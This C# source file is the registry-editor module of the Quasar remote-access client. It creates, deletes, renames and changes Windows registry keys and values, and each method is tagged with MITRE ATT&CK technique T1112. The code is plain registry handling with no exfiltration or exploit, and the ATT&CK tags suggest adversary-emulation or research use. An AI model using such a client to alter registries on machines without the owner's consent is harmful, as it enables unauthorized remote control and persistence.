using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Logger;
using Quasar.Common.Models;
using System;

namespace Quasar.Client.Registry
{
    public class RegistryEditor
    {
        private const string REGISTRY_KEY_CREATE_ERROR = "Cannot create key: Error writing to the registry";

        private const string REGISTRY_KEY_DELETE_ERROR = "Cannot delete key: Error writing to the registry";

        private const string REGISTRY_KEY_RENAME_ERROR = "Cannot rename key: Error writing to the registry";

        private const string REGISTRY_VALUE_CREATE_ERROR = "Cannot create value: Error writing to the registry";

        private const string REGISTRY_VALUE_DELETE_ERROR = "Cannot delete value: Error writing to the registry";

        private const string REGISTRY_VALUE_RENAME_ERROR = "Cannot rename value: Error writing to the registry";

        private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";

        /// <summary>
        /// Attempts to create the desired sub key to the specified parent.
        /// </summary>
        /// <param name="parentPath">The path to the parent for which to create the sub-key on.</param>
        /// <param name="name">output parameter that holds the name of the sub-key that was create.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if action succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
        {
            Logger.Debug(String.Format("Creating registry key at {0}", parentPath));
            name = "";
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);


                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    Logger.Error("Failed to create registry key: " + errorMsg);
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Key #{0}", i);

                while (parent.ContainsSubKey(testName))
                {
                    i++;
                    testName = String.Format("New Key #{0}", i);
                }
                name = testName;

                using (RegistryKey child = parent.CreateSubKeySafe(name))
                {
                    //Child could not be created
                    if (child == null)
                    {
                        errorMsg = REGISTRY_KEY_CREATE_ERROR;
                        Logger.Error("Failed to create registry key: " + errorMsg);
                        return false;
                    }
                }

                //Child was successfully created
                errorMsg = "";
                Logger.Debug("Created registry key.");
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Exception when creating registry key: " + ex.ToString());
                return false;
            }

        }

        /// <summary>
        /// Attempts to delete the desired sub-key from the specified parent.
        /// </summary>
        /// <param name="name">The name of the sub-key to delete.</param>
        /// <param name="parentPath">The path to the parent for which to delete the sub-key on.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
        {
            Logger.Debug(String.Format("Deleting registry key {0}\\{1}", parentPath, name));
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    Logger.Error("Failed to delete registry key: " + errorMsg);
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(name))
                {
                    errorMsg = "The registry: " + name + " does not exist in: " + parentPath;
                    Logger.Error("Failed to delete registry key: " + errorMsg);
                    //If child does not exists then the action has already succeeded
                    return true;
                }

                bool success = parent.DeleteSubKeyTreeSafe(name);

                //Child could not be deleted
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_DELETE_ERROR;
                    Logger.Error("Failed to delete registry key: " + errorMsg);
                    return false;
                }

                //Child was successfully deleted
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Exception when deleting registry key: " + ex.ToString());
                return false;
            }
        }

        /// <summary>
        /// Attempts to rename the desired key.
        /// </summary>
        /// <param name="oldName">The name of the key to rename.</param>
        /// <param name="newName">The name to use for renaming.</param>
        /// <param name="parentPath">The path of the parent for which to rename the key.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
        {
            Logger.Debug(String.Format("Renaming registry key {0}\\{1} to {0}\\{2}", parentPath, oldName, newName));
            try
            {
                RegistryKey parent = GetWritableRegistryKey(parentPath);

                //Invalid can not open parent
                if (parent == null)
                {
                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                    Logger.Error("Failed to rename registry key: " + errorMsg);
                    return false;
                }

                //Child does not exist
                if (!parent.ContainsSubKey(oldName))
                {
                    errorMsg = "The registry: " + oldName + " does not exist in: " + parentPath;
                    Logger.Error("Failed to rename registry key: " + errorMsg);
                    return false;
                }

                bool success = parent.RenameSubKeySafe(oldName, newName);

                //Child could not be renamed
                if (!success)
                {
                    errorMsg = REGISTRY_KEY_RENAME_ERROR;
                    Logger.Error("Failed to rename registry key: " + errorMsg);
                    return false;
                }

                //Child was successfully renamed
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Exception when renaming registry key: " + ex.ToString());
                return false;
            }
        }

        /// <summary>
        /// Attempts to create the desired value for the specified parent.
        /// </summary>
        /// <param name="keyPath">The path to the key for which to create the registry value on.</param>
        /// <param name="kind">The type of the registry value to create.</param>
        /// <param name="name">output parameter that holds the name of the registry value that was create.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
        {
            Logger.Debug(String.Format("Creating registry value at {0}", keyPath));
            name = "";
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    Logger.Error("Failed to create registry value: " + errorMsg);
                    return false;
                }

                //Try to find available names
                int i = 1;
                string testName = String.Format("New Value #{0}", i);

                while (key.ContainsValue(testName))
                {
                    i++;
                    testName = String.Format("New Value #{0}", i);
                }
                name = testName;

                bool success = key.SetValueSafe(name, kind.GetDefault(), kind);

                //Value could not be created
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CREATE_ERROR;
                    Logger.Error("Failed to create registry value: " + errorMsg);
                    return false;
                }

                //Value was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Failed to create registry value: " + ex.ToString());
                return false;
            }

        }

        /// <summary>
        /// Attempts to delete the desired registry value from the specified key.
        /// </summary>
        /// <param name="keyPath">The path to the key for which to delete the registry value on.</param>
        /// /// <param name="name">The name of the registry value to delete.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
        {
            Logger.Debug(String.Format("Deleting registry value {0} at {1}", name, keyPath));
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    Logger.Error("Failed to delete registry value: " + errorMsg);
                    return false;
                }

                //Value does not exist
                if (!key.ContainsValue(name))
                {
                    errorMsg = "The value: " + name + " does not exist in: " + keyPath;
                    Logger.Error("Failed to delete registry value: " + errorMsg);
                    //If value does not exists then the action has already succeeded
                    return true;
                }

                bool success = key.DeleteValueSafe(name);

                //Value could not be deleted
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_DELETE_ERROR;
                    Logger.Error("Failed to delete registry value: " + errorMsg);
                    return false;
                }

                //Value was successfully deleted
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Failed to delete registry value: " + ex.ToString());
                return false;
            }
        }

        /// <summary>
        /// Attempts to rename the desired registry value.
        /// </summary>
        /// <param name="oldName">The name of the registry value to rename.</param>
        /// <param name="newName">The name to use for renaming.</param>
        /// <param name="keyPath">The path of the key for which to rename the registry value.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
        {
            Logger.Debug(String.Format("Renaming registry value {0} at {1} to {2}", oldName, keyPath, newName));
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    Logger.Error("Failed to rename registry value: " + errorMsg);
                    return false;
                }

                //Value does not exist
                if (!key.ContainsValue(oldName))
                {
                    errorMsg = "The value: " + oldName + " does not exist in: " + keyPath;
                    Logger.Error("Failed to rename registry value: " + errorMsg);
                    return false;
                }

                bool success = key.RenameValueSafe(oldName, newName);

                //Value could not be renamed
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_RENAME_ERROR;
                    Logger.Error("Failed to rename registry value: " + errorMsg);
                    return false;
                }

                //Value was successfully renamed
                errorMsg = "";
                return true;

            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Failed to rename registry value: " + ex.ToString());
                return false;
            }
        }

        /// <summary>
        /// Attempts to change the value for the desired registry value for the 
        /// specified key.
        /// </summary>
        /// <param name="value">The registry value to change to in the form of a
        /// RegValueData object.</param>
        /// <param name="keyPath">The path to the key for which to change the 
        /// value of the registry value on.</param>
        /// <param name="errorMsg">output parameter that contains possible error message.</param>
        /// <returns>Returns true if the operation succeeded.</returns>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1112: Modify Registry
        /// </remarks>
        public static bool ChangeRegistryValue(RegValueData value, string keyPath, out string errorMsg)
        {
            Logger.Debug(String.Format("Changing registry value {0} at {1}", value.Name, keyPath));
            try
            {
                RegistryKey key = GetWritableRegistryKey(keyPath);

                //Invalid can not open key
                if (key == null)
                {
                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                    Logger.Error("Failed to change registry value: " + errorMsg);
                    return false;
                }
                
                //Is not default value and does not exist
                if (!RegistryKeyHelper.IsDefaultValue(value.Name) && !key.ContainsValue(value.Name))
                {
                    errorMsg = "The value: " + value.Name + " does not exist in: " + keyPath;
                    Logger.Error("Failed to change registry value: " + errorMsg);
                    return false;
                }

                bool success = key.SetValueSafe(value.Name, value.Data, value.Kind);

                //Value could not be created
                if (!success)
                {
                    errorMsg = REGISTRY_VALUE_CHANGE_ERROR;
                    Logger.Error("Failed to change registry value: " + errorMsg);
                    return false;
                }

                //Value was successfully created
                errorMsg = "";
                return true;
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
                Logger.Error("Failed to change registry value: " + ex.ToString());
                return false;
            }

        }

        public static RegistryKey GetWritableRegistryKey(string keyPath)
        {
            RegistryKey key = RegistrySeeker.GetRootKey(keyPath);

            if (key != null)
            {
                //Check if this is a root key or not
                if (key.Name != keyPath)
                {
                    //Must get the subKey name by removing root and '\\'
                    string subKeyName = keyPath.Substring(key.Name.Length + 1);

                    key = key.OpenWritableSubKeySafe(subKeyName);
                }
            }

            return key;
        }
    }
}
